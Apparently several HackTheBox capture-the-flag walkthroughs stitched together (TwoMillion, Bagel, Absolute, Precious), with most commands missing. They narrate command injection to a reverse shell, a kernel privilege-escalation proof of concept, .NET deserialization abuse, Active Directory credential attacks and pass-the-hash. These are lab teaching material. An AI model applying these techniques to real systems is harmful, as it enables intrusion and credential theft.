This will drop into Bash for an interactive shell.
Looking at the list of locations, I can obviously write to ~/.dstat, but when run with doas, it’ll be running as root, and therefore won’t check /home/player/.dstat. Luckily, /usr/local/share/dstat is writable.
With that in place, I’ll invoke dstat with the 0xdf plugin:
And grab the flag:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 7 Jun 2023
OS : Linux
Base Points : Easy [20]
Creators : TRXTheCyberGeek
Nmap scan:
Host is up (0.097s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  httpCategory: Recon
nmap finds two open TCP ports, SSH (22) and HTTP (80):
Based on the OpenSSH version, the host is likely running Ubuntu 22.04 jammy.
The webserver is redirecting to http://2million.htb.
Because there’s a DNS server names in use, I’ll bruteforce the server to see if anything different comes back with different subdomains of 2million.htb with ffuf:
This run sends HTTP requests to the web server with various different subdomains in the Host header, and looks for any that aren’t the same. It doesn’t find any.
I’ll add this line to my /etc/hosts file:
The site is a throwback to what HackTheBox looked like when it released in 2017:
It’s worth taking a look at the full page, as it has some fun easter eggs, including the original 32 machines, and the scoreboard from September 2017.
Most of the links lead to places on the page. The link to /login gives a login form:
I don’t have creds yet, so nothing here. The forgot password link doesn’t go anywhere.
The “Join” section has a link to /invite:
This page asks for an invite code, with a message that says “Feel free to hack your way in :)”:
This is the original HackTheBox invite challenge - more below.
The HTTP headers don’t give much additional information:
The 404 page is the custom throwback HTB 404 page:
I’m not able to guess any index page extensions.
I’ll run feroxbuster against the site:
There’s a few interesting things in here before it starts just spewing out 500 errors and I kill it. /js/inviteapi.min.js is interesting (and will be important soon). There is a /register, which provides a registration form (it still requires an invite code):
There are a couple endpoints in /api/v1/user. I’ll note that feroxbuster finds these by looking at link targets, not be identifying /api. Therefore, it doesn’t brute force down this path. I may want to come back to that.

Category: Shell as www-data
The Invite Code Challenge was a part of HackTheBox until April 2021. In order to register for an account, you had to hack yourself an invite code. This version is almost exactly the same (with some minor API endpoint changes) as it was back then.
At the bottom of the page, there’s a <script> tag that includes /js/inviteapi.min.js:
The JavaScript is packed / minified, but at the bottom there’s two interesting strings:
Back on /invite (where this code is loaded), I’ll open the browser dev tools, and start typing “make” at the console:
It autocompletes that function as makeInviteCode. I’ll run it:
The raw JSON of the response is:
The hint says the data is encrypted, and the encytpe says it’s ROT13. rot13.com is a nice ROT13 decoder:
Or I can do it from the command line with jq and tr:
To send a POST request to /api/v1/invite/generate, I’ll use curl. -X [method] is how to specify the request method:
To view that nicely, I’ll add -s and pipe it into jq:
The result this time says the format is “encoded”. Looking at the code, it is all numbers and letters and ends with =. That fits base64 encoding nicely. I’ll try decoding that:
That looks like an invite code. I can test it with the verifyInviteCode function in the dev tools console, and it reports it’s valid:
When I put that into the form on /invite, it redirects to /register with the code filled out:
I’m able to register here and login.
With an account, I’ve got access to what looks like the original HackTheBox website:
It says that the site is performing database migrations, and some features are unavailable. In reality, that means most. The Dashboard, Rules, and Change Log links under “Main” work, and have nice throwback pages to the original HTB.
Under “Labs”, the only link that really works is the “Access” page, which leads to /home/access:
Clicking on “Connection Pack” and “Regengerate” both return a .ovpn file. It’s a valid OpenVPN connection config, and I can try to connect with it, but it doesn’t work.
“Connection Pack” sends a GET request to /api/v1/user/vpn/generate, and “Regenerate” sends a GET to /api/v1/user/vpn/regenerate.
I’ll send on of these requests to Burp Repeater and play with the API. /api returns a description:
/api/v1 returns details of the full API:
Unsurprisingly, I am not an admin:
If I try to POST to /api/v1/admin/vpn/generate, it returns 401 Unauthorized:
However, a PUT request to /api/v1/admin/settings/update doesn’t return 401, but 200, with a different error in the body:
I’ll poke at this endpoint a bit more. As it says the content type is invalid, I’ll look at the Content-Type header in my request. There is none so I’ll add one. As the site seems to like JSON, I’ll set it to that:
Now it says email is missing. I’ll add that in the body in JSON:
Now it wants is_admin, so I’ll add that as true:
It’s looking for 0 or 1. I’ll set it to 1, and it seems to work:
If I try the verification again, it says true!
As my account is now an admin, I don’t get a 401 response anymore from /api/v1/admin/vpn/generate:
I’ll add my username, and it generates a VPN key:
My account is now admin.
It’s probably not PHP code that generates a VPN key, but rather some Bash tools that generate the necessary information for a VPN key.
It’s worth checking if there is any command injection.
If the server is doing something like gen_vpn.sh [username], then I’ll try putting a ; in the username to break that into a new command. I’ll also add a # at the end to comment out anything that might come after my input. It works:
To get a shell, I’ll start nc listening on my host, and put a bash reverse shell in as the username:
On sending this, I get a shell at my nc:
I’ll upgrade the shell using the script / stty trick:

Category: Shell as admin
The web root is in the default location, /var/www/html:
index.php defines a bunch of routes for the various pages and endpoints used on the website.
There’s a .env file as well. This file is commonly used in PHP web frame works to set environment variables for use by the application. This application is more faking a .env file rather than actually using it in a framework, but the .env file still looks the same:
That password works for both su as admin:
And SSH:
Either way, I can grab user.txt:

Category: Shell as root
This exploit could actually be carried out as www-data. But if I do get to admin, there is a hint as to where to look.
When I logged in over SSH, there was a line in the banner that said admin had mail. That is held in /var/mail/admin:
It talks about needing to patch the OS as well, and mentions a OverlayFS / FUSE CVE.
TwoMillion is running Ubuntu 22.04 with the kernel 5.15.70:
A search for “linux kernel vulnerability fuse overlayfs” limited to the last year returns a bunch of stuff about CVE-2023-0386:
It’s a bit hard to figure out exactly what versions are effected. This Ubuntu page shows that it’s fixed in 5.15.0-70.77:
It’s not clear how that compares to 5.15.70-051570-generic. That said, this was published on 22 March 2023, and the uname -a string shows a compile date of 23 September 2022.
This blog from Datadog does a really nice job going into the details of the exploit. The issue has to do with the overlay file system, and how files are moved between them. To exploit this, an attacker first creates a FUSE (File System in User Space) file system, and adds a binary that is owned by userid 0 in that file system and has the SetUID bit set. The error in OverlayFS allows for that file to be copied out of the FUSE FS into the main on maintaining it’s owner and SetUID.
There’s a POC for this exploit on GitHub from researcher xkaneiki. The README.md is sparse, but gives enough instruction for use.
I’ll download the ZIP version of the repo:
I’ll upload it to 2million with scp:
I’ll need two shells on 2million, which is easy to do with SSH. I’ll unzip the exploit, go into the folder, and run make all like it says in the README.md:
It throws some errors, but there are now three binaries that weren’t there before:
In the first session, I’ll run the next command from the instructions:
It hangs.
In the other window, I’ll run the exploit:
That’s a root shell!
I’ll grab root.txt:
There’s one last challenge in /root, a file named thank_you.json:
It’s JSON with two keys, encoding which is set to “url” and data. I’ll grab the data and dump it in CyberChef with the “URL Decode” operation:
The result is another JSON blob, this time with "encoding set to “hex”. I’ll move the data to the input, disable the “URL Decode” and add “From Hex”:
Another blob. This time it has a keys for encryption, encryption_key, and encoding. The data looks like base64, so I’ll decode it, and then apply an XOR with the key “HackTheBox”:
It’s a thank you note.
Dear HackTheBox Community,
We are thrilled to announce a momentous milestone in our journey together. With immense joy and gratitude, we celebrate the achievement of reaching 2 million remarkable users! This incredible feat would not have been possible without each and every one of you.
From the very beginning, HackTheBox has been built upon the belief that knowledge sharing, collaboration, and hands-on experience are fundamental to personal and professional growth. Together, we have fostered an environment where innovation thrives and skills are honed. Each challenge completed, each machine conquered, and every skill learned has contributed to the collective intelligence that fuels this vibrant community.
To each and every member of the HackTheBox community, thank you for being a part of this incredible journey. Your contributions have shaped the very fabric of our platform and inspired us to continually innovate and evolve. We are immensely proud of what we have accomplished together, and we eagerly anticipate the countless milestones yet to come.
Here’s to the next chapter, where we will continue to push the boundaries of cybersecurity, inspire the next generation of ethical hackers, and create a world where knowledge is accessible to all.
With deepest gratitude,
The HackTheBox Team
I made a quick video looking at the website source code. It’s a PHP application using routers defined in index.php. Both mistakes I exploited above were made in a very realistic way, which was fun to see.
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 18 Feb 2023
OS : Linux
Base Points : Medium [30]
Nmap scan:
Host is up (0.088s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp
8000/tcp open  http-altCategory: Recon
nmap finds three open TCP ports, SSH (22) and two HTTP (5000 and 8000):
The OpenSSH version doesn’t line up with anything familiar. The HTTP server on 5000 says it’s DotNet (Microsoft-NetCore/2.0), while the one on 8000 says it’s Python.
Visiting this webserver in a browser returns an empty page. Looking a bit more closely in Burp, it’s a 400 Bad Request with an empty body:
I’ll brute force the server with feroxbuster, but it doesn’t find anything either.
I’ve already noted this server is running DotNet, which is interesting for a Linux machine. Not much else here for now.
Visiting by IP address returns a redirect to http://bagel.htb:8000/?page=index.html. I’ll add bagel.htb to my /etc/hosts file and reload. It’s a company selling bagels:
There’s one link on the page, which goes to /orders. This returns text showing orders (best viewed in “view-source” or with curl):
The URL pattern for the main page is odd for Python: http://bagel.htb:8000/?page=index.html. That pattern is typically seen in PHP applications, as it has an include keyword..
The HTTP response headers show it is Python:
Werkzeug is typically seen with Flask, but could be other frameworks as well. The 404 page matches the default Flask 404 as well:
I’ll run feroxbuster against the site, but it finds nothing new:
Given the use of subdomains, I’ll try to brute-force on both webservers to see if either has any subdomains that respond differently from the default response:
Neither find anything.

Category: Shell as phil
I noted above the URL structure that seems to be loading a static HTML page on the main site: http://bagel.htb:8000/?page=index.html. My guess is that the server has a main page that handles things typically like a menu bar, and then loads the child page into the body.
I’ll try a basic file read / directory traversal attack to see if I can read other files on the filesystem:
That’s a successful file read / directory traversal (though not an LFI, please don’t call it that).
I’ll use this vulnerability to get information about the running process. Each process has a folder in /proc/[pid], and /proc/self is a special folder that points to the current pid.
Inside each folder, there’s a bunch of files and symlinks. cmdline shows the running command line of the process:
This file uses null bytes to terminate the command string and the argument string, which makes the output “binary” and curl complains. Adding -o- is typically good enough to say “print the result to the terminal anyway”. There is an invisible null byte between python3 and /home. If I want to be detailed, I can use tr to replace the nulls with spaces:
I can also get the environment variables from environ (this time replacing null with newline):
The process is running as developer (which makes sense as it’s running out of developer’s home directory).
I can also use the command line to get the path to the source:
app.py is a simple single-file Flask application. It starts by importing libraries and initializing the Flask application:
websocket is an interesting import.
There are two routes defined. index is the main page:
This is what takes the page parameter and reads the file, returning it.
order handles /order. The comment here talks about starting the DotNet application first. It also references the user of SSH keys.
It makes a websocket connection to port 5000 (the DotNet application that I couldn’t get much out of earlier). It sends {"ReadOrder":"orders.txt"}, and then returns the ReadOrder key from the result.
To quickly poke at the web socket, I’ll use wscat. It installs with npm install -g wscat, and I’ll use -c to connect to the URL observed in the Flask the source:
At the >, I’ll send what the Flask app sends:
The response (marked with <) is JSON data, with the data in ReadOrder (which is what the Flask app pulls and returns). There’s also a WriteOrder and RemoveOrder which are null.
I can try these. If I send {"WriteOrder":"orders.txt"}, it reports success:
If I read again, it seems to have actually taken the data in WriteOrder and written that to orders.txt:
Another write confirms that:
Sending a file name for RemoveOrder doesn’t seem to change anything:
I went down a bit of a rabbit hole fuzzing for some kind of directory traversal / file read using the websocket and looking at other ways to exploit it.
I’ll try to read /etc/passwd as this application:
It just returns “Order not found!” After playing around for a bit, I’ll try to read ../orders.txt:
It returns orders.txt. That implies that the ../ got removed. This seems to confirm:
It’s not uncommon in PHP that sending something like ....// gets filtered down to ../ when the inner ../ is removed. That doesn’t work here:
I would expect a not found if the ../ got through. It seems that all .. and / are removed. That is confirmed by this:
When the .. and / are removed, it leaves orders.txt.
I’d like to find what is running the service on 5000 just like I did for 8000. The comment in the source said to run it with dotnet <dll>. I’ll use ffuf to scan over a range of pids, and -mr dotnet to match results that have “dotnet” in them. With the command line to the process running dotnet, I’ll either get the full path to the dll, or I’ll get a relative path, which is still good enough (as I can then use the cwd symlink in /proc/[pid] to get into that directory and get the file).
ffuf doesn’t have a range generation like wfuzz, but I can use <( seq 1 10000) to make a temp file with the numbers 1 to 10000 in it one per line.
There’s a bunch of hits, but all the same size (and all the same on some inspection).
The various cmdlines are all the same:
I’m able to get the DLL file:
Because the executable is a .Net assembly, that means it will decompile back to something resembling source fairly easily. There are tools to do this on Linux (such as ilspy) and many on Windows. My favorite is DNSpy, which runs on Windows, and I’ll show that here. The others are just as good - I’d recommend people use the one they are most comfortable with.
The program has the namespace bagel_server, with six classes in it. The main program is based out of the Bagel class, which starts in Main, but really is handled by MessgeReceived.
The other important classes for understanding how the program works and how to exploit it are Handler, Orders, and File. I’ll also look at the DB class to get some information for later.
Main, InitializeServer, and StartServer are all involved in getting the server up and running. MessageReveived runs each time there’s a message on the websocket:
A Handler object is created, and used to Deserialize the received JSON. Then the result is passed back to Seialize and the resulting string is sent back.
The entire structure of this program is designed such that each object has a getter and a setter function. When the object is created, the setter is called. When it is serialized into JSON, the getter is called.
While reading this code, it’s important to remember that JSON is deserialized into an object by calling the setter. An object is serialized into JSON by calling the getter.
The Handler class is easy to overlook, but it is where the vulnerability is configured. A Handler object has two methods, Serialize and Deserialize:
It’s using JsonConvert (docs), part of the Newtonsoft.Json package.
SerializeObject takes an object and returns a JSON serialized object (a string). DeserializeObject does that opposite, going from JSON string to a Base object in in memory. It’s important to note that it must be a Base object (as specified by the <Base> syntax).
The fact that both are setting the TypeNameHandling to 4 is important. The docs hint at the risk here:
The value is set to 4 = Auto here.
An Orders object has three public properties, ReadOrder, RemoveOrder, and WriteOrder, as well as three private members, file, order_filename, and order_info.
In C# (and other programming languages), a property is a member of the class with a function defined for when something tries to read it (the getter) and another defined for when something tries to write it (the setter). The ReadOrder property is defined as:
When ReadOrder is set, it sets this.file.ReadFile to the input value, after removing / and .. (which explains why I couldn’t traverse above). When the object is read from it calls the get, which is a file.ReadFile property (so the getter from this object property).
WriteOrder is very similar:
It will call the setter on WriteFile with the input value, and then the result will be the getter on that same object.
RemoveOrder doesn’t define the getter and setter, which means that by default it just saves the value passed in, and returns it when read:
The Base class derives from the Orders class:
This means it has all the properties / members of Order, plus three properties (UserId, Session, and Time) and two private members (userid and session). It sets userid to 0 and session to “Unauthorized”, and the setters are never called.
The File class defines ReadFile and WriteFile. ReadFile has getter and setter functions:
So when above this.file.ReadFile is set equal to something, this.filename becomes that something, and then ReadContent is called with this.directory + this.filename. These two are initialized to:
ReadContent sets this.file_content to the values read from the file, or to “Order not found!”:
Then when the getter on ReadFile is called, it returns this.file_content.
WriteFile is similar:
On calling the setter, it calls WriteContent on the current file, which writes the file, and sets this.IsSuccess:
The getter returns this.IsSuccess.
The DB class isn’t in use. It seems to be in-development for later use. Still, it has a connection string in it:
I’ll note that password for later.
This diagram attempts to summaries how the base case of the message {"ReadOrder": "orders.txt"} is processed by the server:
The issue comes down to where the JsonSerializerSettings sets the TypeNameHandling to 4, which is Auto. When serializing to JSON, .NET can include the .NET type name in the object / array or not. Auto allows for leaving it out, or including it if the object type doesn’t match what is declared in the code.
This article is a summary of this very detailed blackhat paper, and gives examples of vulnerable code, and how to abuse it.
This looks very much like what comes back from the Handler.Deserialize call.
To abuse this, I need a object that has either an empty constructor or only one constructor with parameters. All of the object constructors are empty in this application, so that fits.
The top level object will be Base object. My attack is going to be
I’ll use the RemoveOrder object since it’s getter doesn’t do anything, which is good so it won’t interfere with my attack. I’ll pass an object that in the process of deserializing the RemoveOrder object, also deserializes a ReadFile object. This object can read arbitrary files. The challenge is that to create one through the legit path requires going through the ReadOrder object, which filters out .. and /. If I can create one directly, I can read arbitrary files.
The Json.NET docs give some examples of what it looks like with the different TypeNameHandling settings. When the type of the object is included, the JSON might look like:
This tells Dotnet to handle this as a different type of object when it deserializes it from JSON into an object. I’m going to submit an object as RemoveOrder, as that blindly sets whatever I send as the value, and thus I can get it to create (and call the setter for) another object. I’ll have a File object created, with the ReadFile set to the contents of /etc/passwd. That will look something like:
The Namespace is what I noted above, and the ClassName is the class with the object. The AssemblyName I’ll get from PowerShell:
This diagram shows how this payload is processed by the server:
To test this, I’ll get rid of the white space to get it on one line, and send:
It works! It create a RemoveOrder object with a ReadFile in it that has /etc/passwd!
Just like with the previous file read, I can get the command line and environment here:
The process is running out of /home/phil.
Reading /home/phil/.ssh/id_rsa returns a private SSH key:
A quick way to reform a key like this with \n in it is with jq:
It works:
And I can get user.txt:

Category: Shell as developer
There’s not much to see as phil. Their home directory is relatively empty:
There’s one other user, developer, but phil can’t access their home directory:
The project for the Dotnet application is in /opt/bagel :
There’s no source in this directory - it seems to have been removed.
I do have the password of “k8wdAYYKyhnjg3K” for the dev user to the future MySQL instance from the DLL. It works for developer:

Category: Shell as root
The developer user can run dotnet as root with sudo:
Running dotnet -h returns a long help menu:
There’s a lot possible here, and several ways to exploit this.
In scrolling through these, fsi jumps out as an interesting command - “Start F# Interactive / execute F# script”.
A simple F# script to get a shell is System.Diagnostics.Process.Start("id").WaitForExit(); This will run whatever shell command it’s given:
For whatever reason, F# needs ;; to end this line.
I can do the same thing and invoke bash:
From there, grab the flag:
For fun, I’ll show how to create a fill C# application instead of running it from the F# terminal. I’ll create a directory, /dev/shm/exploit, and go into it. From there, I’ll create a new project with dotnet:
This creates a .csproj file, a starter Program.cs, and an obj directory. The source is a simple Hello World:
It runs:
I’ll update Program.cs to invoke a shell just as I did above:
It works:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 24 Sep 2022
OS : Windows
Base Points : Insane [50]
Nmap scan:
Host is up (0.087s latency).
Not shown: 65509 closed ports
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49686/tcp open  unknown
49692/tcp open  unknown
49699/tcp open  unknown
49703/tcp open  unknownCategory: Recon
nmap finds a bunch of open TCP ports, typical of a Windows domain controller:
The IIS version suggests Absolute is running Windows 10 / Server 2016 or later. The LDAP scan shows the hostname of dc.absolute.htb. I’ll add it and the base domain to my /etc/hosts file:
There’s a seven hour clock skew, which I’ll want to keep in mind if I am doing any Kerberos auth.
I’ll note that WinRM (5985) is open for when I find creds.
I’m not able to get a connection to SMB without creds:
ldapsearch will give the base naming context, which matches absolute.htb:
Trying to get any additional information requires auth:
I can try a zone transfer, but it fails:
I can confirm the two names I already know:
I’ll brute force subdomains with dnsenum. It confirms what I identified manually above, and finds a few other subdomains via bruteforce:
None of these are particularly interesting.
The website is a simple page focused on design and images:
The image rotates every few seconds. The only link leads to the template.
The HTTP response headers just say IIS without much else:
The front page itself loads as index.html, suggesting perhaps it’s just a static site.
The 404 page looks a lot like the IIS default 404.
The rotating pictures seem to be in a hero-slider and owl-carousel div:
I’ll run feroxbuster against the site:
It finds a handful of stuff, but nothing interesting.

Category: Auth as d.klay
I’ll download the six “hero” images from the carousel with a simple Bash loop, for i in $(seq 1 6); do wget http://absolute.htb/images/hero_${i}.jpg; done. I’ll look a the metadata on the image with exiftool:
James Roberts is the “Author” and “Artist”. The others dont have an “Artist”, but they all have an “Author” field.
With a list of users, I can test Kerberos to see if any are valid usernames. I’ll get a list of user names:
I could take each of these and generate a list of possible common usernames by hand, but it’s easier to use username-anarchy to generate a list of usernames:
kerbrute is a tool for brute-forcing Kerberos. One of the options, userenum will check which names in a list are valid usernames:
It’s clear that this domain is using [first initial].[lastname] as the username syntax.
Alternatively, crackmapexec can also handle this check (shown with a smaller username list to demonstrate the difference):
The purple [-] fails with STATUS_ACCOUNT_RESTRICTION rather than the others which return STATUS_LOGON_FAILURE, suggesting those accounts exist.
Without passwords, I still can’t connect to the domain to try Bloodhound or Kerberoasting. I can check for AS-Rep-Roast-able users:
d.klay is vulnerable.
I’ll give this hash to hashcat and have it try rockyou.txt against it:
The password is Darkmoonsky248girl.
Trying to validate that with crackmapexec fails:
STATUS_ACCOUNT_RESTRICTION typically means NTLM is disabled, and I’ll need to use Kerberos for auth. That works:
Some tools like crackmapexec can just speak Kerberos on their own. For others, I’ll need t get a ticket. I can generate one with kinit:
klist shows that this has created a ticket in /tmp/krb5cc_1000 and other ticket details.
If the clock skew between my time and the DC’s is too large, this will fail. In VirtualBox, I’ll need to stop the guest tools from syncing the clock with sudo service vboxadd-service stop. Then I’ll run sudo ntpdate 10.10.11.181.

Category: Auth as svc_smb
With creds, I’ll collect Bloodhound data with Bloodhound-Python:
I’ll upload the data into Bloodhound, and find d.klay, marking them as owned:
Unfortunately, this user has no local admin rights, no execution rights, and no outbound object control rights of interest:
With creds, I can look at SMB shares:
I’ll connect using Impacket’s smbclient.py:
I can list the shares, and connect to a share, like SYSVOL:
There’s nothing interesting here.
With creds now, I can connect to LDAP. One thing to pull would be the list of users. crackmapexec will do this:
Not only does it give the users, but also the description field if it’s populated (may need to scroll over to see it above). The svc_smb user description of “AbsoluteSMBService123!” looks like a password.
crackmapexec confirms this:
If I need to get into LDAP with more detail, I’d use ldapsearch. There are a couple errors that are likely to come up. If I try to run with creds, it will return AcceptSecurityContext:
This is because the account is restricted (no NTLM, only Kerberos).
I’ll use -Y GSSAPI to specify Kerberos auth. It’s also good to install the libsasl2-modules-gssapi-mit package with apt to prevent another error.
With kinit having a ticket, I was still getting this error:
To fix this, I’ll make sure that dc.absolute.htb comes before absolute.htb in my /etc/hosts file. That’s because Kerberos is doing a reverse lookup on the IP to get the server name. My OS checks the hosts file, and gets the first host with that IP. Then when it tries to look up that host (absolute.htb) in the Kerberos DB, it doesn’t find one, and returns Server not found in Kerberos database. Props to Ippsec for figuring this out - he shows this in Wireshark in his video here.
With these issues resolved, I’m able to query LDAP:
The password can be found in the information for the svc_smb user.

Category: Auth as m.lovegod
I’ll mark svc_smb owned:
Unfortunately, the permissions are the same as d.klay.
As svc_smb, I get read access to several shares:
Now I have access to Shared. I’ll connect with smbclient.py:
There’s two files. I’ll download both:
compiler.sh is a single line, used to compile a Nim program. test.exe is a Windows 64-bit exe:
It’s probably written in Nim.
I’ll move over to a Windows machine and give this a run. Nothing happens. I’ll run with Wireshark, and notice that there’s a bunch of DNS queries going out:
I’ll update my hosts file to include _ldap._tcp.dc.absolute.htb, and re-run the program. After 25-30 seconds after execution, there’s an attempt to bind to LDAP on Absolute:
Following that stream, it looks like there may be creds in there:
It’s getting the same AcceptSecurityContext error that I got above when using NTLM. Digging into the bindRequest(1) packet in Wireshark, there are creds for mlovegod:
These creds actually don’t work as they are in the binary:
That username isn’t known, and it doesn’t fit the format for the other accounts. There is a m.lovegod in the users identified above over LDAP. That works:

Category: Shell as winrm_user
m.lovegod owns the Network Audit group, which has GenericWrite on the winrm_user user:
m.lovegod is a member of three groups, but not Network Audit:
winrm_user is a member of Remote Management Users, which means that they can connect to WinRM and get a shell:
To get access to winrm_user, I’ll first I’ll need to give m.lovegod write access on the Network Audit group. Then I can add m.lovegod to the group. Finally, I can use those permissions to create a shadow credential for the winrm_user account.
The first two steps are much easier to do on Windows (and Bloodhound tells you the commands to run). I’ll show both Windows and Linux.
The “Shadow Credential” technique involves manipulating the user’s msDS-KeyCredentialLink attribute, which binds a credential to their account that I can then use to authenticate. This technique is much less disruptive than just changing the user’s password. This post from Spector Ops has a ton of good detail.
Bloodhound gives the abuse info for doing this:
To get this attack to work, I had to configure Absolute’s IP as a DNS server for my VPN interface:
In PowerShell, I’ll import PowerView, and create a credential:
If I try to run the command just like above, it will say that -PrincipleIdentity is required. Looking at the docs, I’ll add that and the -DomainController options.
Now to add m.lovegod to the group, I’ll use another PowerView commandlet, Add-DomainGroupMember:
It works:
There is a script reverting these memberships periodically, so if one fails, I’ll start at the beginning and re-enable the access.
There is a neat Impacket script that hasn’t been merged yet in this pull request for a script. It provides an example script called dacledit.py that does the same thing that Add-DomainObject Acl does.
I’ll clone this repo, checkout the dacledit branch, and install:
Now I can run the script from anywhere on my host:
This is adding the WriteMembers permission to m.lovegod. This script doesn’t use any existing ticket, so I’m giving it a full username and password.
To add the user to the group, I’ll use net (which installs with apt install samba). The most reliable way to use this is with --use-kerberos=required, though for some reason it asks for a password on each run. Still it works, as m.lovegod isn’t in the group, then I add them, and then they are:
Alternatively, if I use -k, it will use my ticket from kinit. I found I had to delete that ticket and re-initialize it often or I would get errors:
In Outdated, I showed how to do this on target using Whisker and remotely with PyWhisker. PyWhisker would work here, but Certipy has the several steps packaged into one command, so I’ll show that here. It installs with pip install certipy-ad.
certipy find will return all sorts of information about the domain and how Active Directory Certificate Services (ADCS) is configured. It doesn’t check /tmp/krb5cc by default, so I’ll need to set that environment variable to be able to use it:
I can look at this, but right now this is just a good sign that ADCS is installed.
This next command needs a Kerberos ticket to work, and it seems like it must be generated after the m.lovegod user has been added to the group. The following error means that I need to delete my ticket and re-create it (either with kinit or getTGT.py):
certipy shadow auto will add the shadow credential to the winrm_user user:
This has created a credential and given both the NT hash (which isn’t useful for me here) and saved a ticket in winrm_user.ccache.
I’ll use the new cred to get an evil-winrm shell:
And grab user.txt:

Category: Shell as administrator
A very popular Kerberos-based attack for the last couple years has been KrbRelay. This technique was first discussed in a Google Project Zero post on October 2021, and then Cube0x0 made a public POC, KrbRelay in February 2022. In Aprl 2022, KrbRelayUp automated the most common pathways from KrbRelay
The idea is to relay an authentication request through a server back to the DC to get authenticated for whatever mischief the attacker desires.
After a full year of this bug being referred to as “not to be patched”, Microsoft changed their stance and did that in October 2022.
This MS patch also effects krbrelay. It looks like we had our fun with rpc->ldap https://t.co/lAWJltswBg
For this attack to work, the target must:
In theory, crackmapexec might be able to check LDAP signing, but as of the time of my solving, it has a bug that causes it to fail here (I’ve raised this with the devs…hopefully it’ll be fixed soon!):
I don’t have a great way to check if LDAP signing is enabled. Given that disabled is the Windows default, and that the box was released in September 2021 (before the patch was released), it’s a wise thing to try.
I’ll clone the repo to my Windows host and open the .sln file in Visual Studio. I’ll go to Built > Batch Build to get this dialog:
I’ll select both release configurations for Build, and click Build. There are a fair number of warnings, but it reports success and gives an .exe path for each binary:
I’ll copy both binaries back to my Linux box and upload them to Absolute.
CheckPort.exe will identify the port that the malicious server will run on:
It identifies port 10.
Very similar to how many of the Potato attacks work, I’ll need a CLSID for a valid RPC service with the correct permissions. There are tools to discover these on the target host, but it’s often easier and faster just to pick from some of the default ones listed.
This host is running Windows 10.0.17763.3406:
That maps to server 2019 or Windows 10. There’s a list of default CLSIDs by OS on the KrbRelay README.
I’ll run this now with the syntax from the README.md, and it fails:
This failure is due to the fact that the exploit requires an interactive session, such as a console. In these sessions, credentials are stored in memory, and thus accessible to the exploit, as opposed to in the WinRM remoting that I have now.
RunAsCs is a tool that allows for running as different users with creds. I’ll download the release and upload it to Absolute.qq
I’ve got creds for m.lovegod, so I’ll wrap my previous command in RunasCs.exe with that username and password and -d to give the domain. It fails:
It’s trying to create a logon type 2 process, which is blocked (presumably due to NTLM’s being disabled). It suggests to use type 3, but that fails as well.
This Microsoft page has a table of logon types. Runas / Network are the examples for type 9. I’ll try that:
It reports success. And winrm_user is in the Administrators group:
And can read root.txt:
KrbRelayUp takes common attack paths with KrbRelay and automates them. Unfortunately, none of them quite work here. I’ll download a copy from SharpCollection and upload it to Absolute.
Just like above, I’ll need to run it in a active session with RunasCs. It seems to work:
However, running that command doesn’t work. That’s because it’s trying to spawn a shell, and something is blocking it.
I’ll run this again and look at the output:
It’s asking me to run KrbRelayUp.exe spawn with the following parameters, which I can figure out with the help and/or GitHub README:
KrbRelayUp is reporting that it successfully ran the attack, and created shadow creds for the computer account. If that’s the case, I can try to use this certificate / password in a different way. I’ll grab a copy of Rubeus (from Sharp Collection) and upload it. I’ll use the asktgt command with the following options:
The NTLM hash at the bottom is for the computer account.
All the accounts I’ve interacted with so far have been in the Protected Users group, which is what has prevented NTLM authentication.
The machine account is not in that group, and thus I can use this recovered NTLM hash to authenticate.
I’ve shown using an admin hash with secretsdump.py many times before. The DC machine account is also authorized to do this, and it can also be done with crackmapexec:
From my shell as winrm_user, it’s clear that administrator is also not in the Protected Users group:
The NTLM hash for administrator can be used to get a shell as administrator:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 26 Nov 2022
OS : Linux
Base Points : Easy [20]
Nmap scan:
Host is up (0.083s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  httpCategory: Recon
nmap finds two open TCP ports, SSH (22) and HTTP (80):
Based on the OpenSSH version, the host is likely running Debian 11 bullseye. There’s an HTTP redirect on port 80 to precious.htb.
I’ll use ffuf to fuzz the HTTP server for any host subdomains that return something different from the standard response. I’ll use:
It doesn’t find anything else:
I’ll add the domain to my /etc/hosts file:
The site is a single simple form:
If I pass it http://precious.htb, it hangs for a second and returns:
Either local access is blocked, it’s a DNS issue. http://precious and http://127.0.0.1 return the same, so it seems like a block. I’ll note this as some thing to check when I get access, but it’s not super important at the moment other than to know I can’t get access to local stuff. I’ll fix this in Beyond Root.
Similarly, URLs like file:///etc/passwd return an error saying it’s not a valid URL.
I’ll give it http://10.10.14.6, and start a Python webserver (python -m http.server), and there’s a hit:
And it returns a PDF:
Submitting a URL sends a POST request to / with the POST body of url=:
The HTTP headers show not only nginx, but more:
It’s running Ruby, and Phusion Passenger, a web application server that supports Ruby, Python, Node, and Meteor applications.
Running exiftool to look at the metadata on the downloaded PDF shows a “Creator” of “Generated by pdfkit v0.8.6”:
I’ll run feroxbuster against the site, and it finds nothing:

Category: Shell as ruby
Searching for “pdfkit v0.8.6” returns a ton of hits about CVE-2022-25765. Many of these are based on Precious, but even if I limit the search to pages from before Precious’ launch, there’s still the same results:
The Snyk article has a nice short summary of how this is exploited and shows what a vulnerable call might look like:
The example attack version is:
Thinking about how the webserver might be built, it’s fair to say that it’s getting a URL from the POST request, and sending that into a call to PDFKit.new as shown above.
